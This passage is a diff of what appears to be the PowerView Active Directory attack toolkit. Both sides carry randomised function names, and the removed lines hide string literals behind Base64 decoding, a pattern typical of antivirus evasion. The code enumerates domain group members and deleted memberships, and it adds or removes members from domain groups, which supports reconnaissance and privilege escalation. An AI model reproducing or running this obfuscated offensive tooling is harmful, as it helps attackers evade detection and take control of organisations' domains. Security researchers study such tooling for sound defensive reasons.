+                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
+                            $GroupSearcher = vydvzz @SearcherArguments
                         }
                     }
                     else {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
+                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                     }
                 }
 
                 if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                    $Filter += "(|$IdentityFilter)"
                 }
 
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXI=")))
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+                if ($PSBoundParameters['LDAPFilter']) {
+                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
+                    $Filter += "$LDAPFilter"
                 }
 
-                $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApJEZpbHRlcik=")))
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gR2V0LURvbWFpbkdyb3VwTWVtYmVyIGZpbHRlciBzdHJpbmc6IHswfQ=="))) -f $($GroupSearcher.filter))
+                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
+                Write-Verbose ("[Get-DomainGroupMember] Get-DomainGroupMember filter string: {0}" -f $($GroupSearcher.filter))
                 try {
                     $Result = $GroupSearcher.FindOne()
                 }
                 catch {
-                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3Igc2VhcmNoaW5nIGZvciBncm91cCB3aXRoIGlkZW50aXR5ICckSWRlbnRpdHknOiB7MH0="))) -f $_)
+                    Write-Warning ("[Get-DomainGroupMember] Error searching for group with identity '$Identity': {0}" -f $_)
                     $Members = @()
                 }
 
@@ -6560,7 +6564,7 @@ function dfkygh {
                 $GroupFoundDN = ''
 
                 if ($Result) {
-                    $Members = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVy"))))
+                    $Members = $Result.properties.item('member')
 
                     if ($Members.count -eq 0) {
                         
@@ -6570,19 +6574,19 @@ function dfkygh {
 
                         while (-not $Finished) {
                             $Top = $Bottom + 1499
-                            $MemberRange=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVyO3JhbmdlPSRCb3R0b20tJFRvcA==")))
+                            $MemberRange="member;range=$Bottom-$Top"
                             $Bottom += 1500
                             $Null = $GroupSearcher.PropertiesToLoad.Clear()
-                            $Null = $GroupSearcher.PropertiesToLoad.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE1lbWJlclJhbmdl"))))
-                            $Null = $GroupSearcher.PropertiesToLoad.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU="))))
-                            $Null = $GroupSearcher.PropertiesToLoad.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU="))))
+                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
+                            $Null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')
+                            $Null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')
 
                             try {
                                 $Result = $GroupSearcher.FindOne()
-                                $RangedProperty = $Result.Properties.PropertyNames -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVyO3JhbmdlPSo=")))
+                                $RangedProperty = $Result.Properties.PropertyNames -like "member;range=*"
                                 $Members += $Result.Properties.item($RangedProperty)
-                                $GroupFoundName = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU="))))[0]
-                                $GroupFoundDN = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU="))))[0]
+                                $GroupFoundName = $Result.properties.item('samaccountname')[0]
+                                $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
 
                                 if ($Members.count -eq 0) {
                                     $Finished = $True
@@ -6594,18 +6598,18 @@ function dfkygh {
                         }
                     }
                     else {
-                        $GroupFoundName = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU="))))[0]
-                        $GroupFoundDN = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU="))))[0]
+                        $GroupFoundName = $Result.properties.item('samaccountname')[0]
+                        $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
                         $Members += $Result.Properties.item($RangedProperty)
                     }
 
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
+                    if ($PSBoundParameters['Domain']) {
                         $GroupFoundDomain = $Domain
                     }
                     else {
                         
                         if ($GroupFoundDN) {
-                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                     }
                 }
@@ -6617,18 +6621,18 @@ function dfkygh {
                 }
                 else {
                     $ObjectSearcherArguments = $SearcherArguments.Clone()
-                    $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Member
-                    $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $True
-                    $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsY24sc2FtYWNjb3VudG5hbWUsb2JqZWN0c2lkLG9iamVjdGNsYXNz")))
-                    $Object = kzvwpf @ObjectSearcherArguments
+                    $ObjectSearcherArguments['Identity'] = $Member
+                    $ObjectSearcherArguments['Raw'] = $True
+                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
+                    $Object = guawbd @ObjectSearcherArguments
                     $Properties = $Object.Properties
                 }
 
                 if ($Properties) {
                     $GroupMember = New-Object PSObject
-                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEb21haW4="))) $GroupFoundDomain
-                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupFoundName
-                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEaXN0aW5ndWlzaGVkTmFtZQ=="))) $GroupFoundDN
+                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain
+                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName
+                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN
 
                     if ($Properties.objectsid) {
                         $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
@@ -6639,29 +6643,29 @@ function dfkygh {
 
                     try {
                         $MemberDN = $Properties.distinguishedname[0]
-                        if ($MemberDN -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZWlnblNlY3VyaXR5UHJpbmNpcGFsc3xTLTEtNS0yMQ==")))) {
+                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {
                             try {
                                 if (-not $MemberSID) {
                                     $MemberSID = $Properties.cn[0]
                                 }
-                                $MemberSimpleName = vqxllx -Identity $MemberSID -OutputType ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluU2ltcGxl"))) @ADNameArguments
+                                $MemberSimpleName = jjxazw -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments
 
                                 if ($MemberSimpleName) {
-                                    $MemberDomain = $MemberSimpleName.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QA=="))))[1]
+                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                 }
                                 else {
-                                    Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgY29udmVydGluZyAkTWVtYmVyRE4=")))
+                                    Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                     $MemberDomain = $Null
                                 }
                             }
                             catch {
-                                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgY29udmVydGluZyAkTWVtYmVyRE4=")))
+                                Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                 $MemberDomain = $Null
                             }
                         }
                         else {
                             
-                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                     }
                     catch {
@@ -6676,7 +6680,7 @@ function dfkygh {
                     else {
                         
                         try {
-                            $MemberName = ylepkl -ObjectSID $Properties.cn[0] @ADNameArguments
+                            $MemberName = rnmqfb -ObjectSID $Properties.cn[0] @ADNameArguments
                         }
                         catch {
                             
@@ -6684,32 +6688,32 @@ function dfkygh {
                         }
                     }
 
-                    if ($Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29tcHV0ZXI=")))) {
-                        $MemberObjectClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29tcHV0ZXI=")))
+                    if ($Properties.objectclass -match 'computer') {
+                        $MemberObjectClass = 'computer'
                     }
-                    elseif ($Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA=")))) {
-                        $MemberObjectClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA=")))
+                    elseif ($Properties.objectclass -match 'group') {
+                        $MemberObjectClass = 'group'
                     }
-                    elseif ($Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcg==")))) {
-                        $MemberObjectClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcg==")))
+                    elseif ($Properties.objectclass -match 'user') {
+                        $MemberObjectClass = 'user'
                     }
                     else {
                         $MemberObjectClass = $Null
                     }
-                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) $MemberDomain
-                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $MemberName
-                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWU="))) $MemberDN
-                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyT2JqZWN0Q2xhc3M="))) $MemberObjectClass
-                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyU0lE"))) $MemberSID
-                    $GroupMember.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkdyb3VwTWVtYmVy"))))
+                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
+                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
+                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN
+                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass
+                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
+                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                     $GroupMember
 
                     
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZQ==")))] -and $MemberDN -and ($MemberObjectClass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA="))))) {
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gTWFudWFsbHkgcmVjdXJzaW5nIG9uIGdyb3VwOiAkTWVtYmVyRE4=")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $MemberDN
-                        $Null = $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))))
-                        dfkygh @SearcherArguments
+                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
+                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
+                        $SearcherArguments['Identity'] = $MemberDN
+                        $Null = $SearcherArguments.Remove('Properties')
+                        yimpvw @SearcherArguments
                     }
                 }
             }
@@ -6719,7 +6723,7 @@ function dfkygh {
 }
 
 
-function mlygop {
+function jmgsqd {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -6752,7 +6756,7 @@ function mlygop {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -6775,44 +6779,44 @@ function mlygop {
 
     BEGIN {
         $SearcherArguments = @{
-            'Properties'    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsdmFsdWVtZXRhZGF0YQ=="))),'distinguishedname'
+            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
             'Raw'           =   $True
-            'LDAPFilter'    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENhdGVnb3J5PWdyb3VwKQ==")))
+            'LDAPFilter'    =   '(objectCategory=group)'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
-        kzvwpf @SearcherArguments | ForEach-Object {
-            $ObjectDN = $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))][0]
-            ForEach($XMLNode in $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsdmFsdWVtZXRhZGF0YQ==")))]) {
-                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RFNfUkVQTF9WQUxVRV9NRVRBX0RBVEE="))) -ErrorAction SilentlyContinue
+        guawbd @SearcherArguments | ForEach-Object {
+            $ObjectDN = $_.Properties['distinguishedname'][0]
+            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
+                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                 if ($TempObject) {
-                    if (($TempObject.pszAttributeName -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVy")))) -and (($TempObject.dwVersion % 2) -eq 0 )) {
+                    if (($TempObject.pszAttributeName -Match 'member') -and (($TempObject.dwVersion % 2) -eq 0 )) {
                         $Output = New-Object PSObject
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBETg=="))) $ObjectDN
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRE4="))) $TempObject.pszObjectDn
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZUZpcnN0QWRkZWQ="))) $TempObject.ftimeCreated
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZURlbGV0ZWQ="))) $TempObject.ftimeDeleted
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nQ2hhbmdl"))) $TempObject.ftimeLastOriginatingChange
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZXNBZGRlZA=="))) ($TempObject.dwVersion / 2)
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nRHNhRE4="))) $TempObject.pszLastOriginatingDsaDN
-                        $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkRvbWFpbkdyb3VwTWVtYmVyRGVsZXRlZA=="))))
+                        $Output | Add-Member NoteProperty 'GroupDN' $ObjectDN
+                        $Output | Add-Member NoteProperty 'MemberDN' $TempObject.pszObjectDn
+                        $Output | Add-Member NoteProperty 'TimeFirstAdded' $TempObject.ftimeCreated
+                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
+                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
+                        $Output | Add-Member NoteProperty 'TimesAdded' ($TempObject.dwVersion / 2)
+                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
+                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                         $Output
                     }
                 }
                 else {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlckRlbGV0ZWRdIEVycm9yIHJldHJpZXZpbmcgJ21zZHMtcmVwbHZhbHVlbWV0YWRhdGEnIGZvciAnJE9iamVjdERO")))
+                    Write-Verbose "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                 }
             }
         }
@@ -6820,7 +6824,7 @@ function mlygop {
 }
 
 
-function ydhqjd {
+function naywwb {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -6849,17 +6853,17 @@ function ydhqjd {
         $ContextArguments = @{
             'Identity' = $Identity
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
 
-        $GroupContext = vfqaum @ContextArguments
+        $GroupContext = aozfoj @ContextArguments
 
         if ($GroupContext) {
             try {
                 $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
             }
             catch {
-                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiB7MH0="))) -f $_)
+                Write-Warning ("[Add-DomainGroupMember] Error finding the group identity '$Identity' : {0}" -f $_)
             }
         }
     }
@@ -6867,9 +6871,9 @@ function ydhqjd {
     PROCESS {
         if ($Group) {
             ForEach ($Member in $Members) {
-                if ($Member -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LitcXC4r")))) {
-                    $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Member
-                    $UserContext = vfqaum @ContextArguments
+                if ($Member -match '.+\\.+') {
+                    $ContextArguments['Identity'] = $Member
+                    $UserContext = aozfoj @ContextArguments
                     if ($UserContext) {
                         $UserIdentity = $UserContext.Identity
                     }
@@ -6878,7 +6882,7 @@ function ydhqjd {
                     $UserContext = $GroupContext
                     $UserIdentity = $Member
                 }
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5Hcm91cE1lbWJlcl0gQWRkaW5nIG1lbWJlciAnJE1lbWJlcicgdG8gZ3JvdXAgJyRJZGVudGl0eQ==")))
+                Write-Verbose "[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'"
                 $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                 $Group.Members.Add($Member)
                 $Group.Save()
@@ -6888,7 +6892,7 @@ function ydhqjd {
 }
 
 
-function ienysb {
+function jptqyb {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -6917,17 +6921,17 @@ function ienysb {
         $ContextArguments = @{
             'Identity' = $Identity
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
 
-        $GroupContext = vfqaum @ContextArguments
+        $GroupContext = aozfoj @ContextArguments
 
         if ($GroupContext) {
             try {
                 $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
             }
             catch {
-                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiB7MH0="))) -f $_)
+                Write-Warning ("[Remove-DomainGroupMember] Error finding the group identity '$Identity' : {0}" -f $_)
             }
         }
     }
@@ -6935,9 +6939,9 @@ function ienysb {
     PROCESS {
         if ($Group) {
             ForEach ($Member in $Members) {
-                if ($Member -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LitcXC4r")))) {
-                    $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Member
-                    $UserContext = vfqaum @ContextArguments
+                if ($Member -match '.+\\.+') {
+                    $ContextArguments['Identity'] = $Member
+                    $UserContext = aozfoj @ContextArguments
                     if ($UserContext) {
                         $UserIdentity = $UserContext.Identity
                     }
@@ -6946,7 +6950,7 @@ function ienysb {
                     $UserContext = $GroupContext
                     $UserIdentity = $Member
                 }
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5Hcm91cE1lbWJlcl0gUmVtb3ZpbmcgbWVtYmVyICckTWVtYmVyJyBmcm9tIGdyb3VwICckSWRlbnRpdHk=")))
+                Write-Verbose "[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'"
                 $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                 $Group.Members.Remove($Member)
                 $Group.Save()
@@ -6956,7 +6960,7 @@ function ienysb {
 }
 
 
-function xgedtj {
+function ynorqw {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -6986,7 +6990,7 @@ function xgedtj {
 
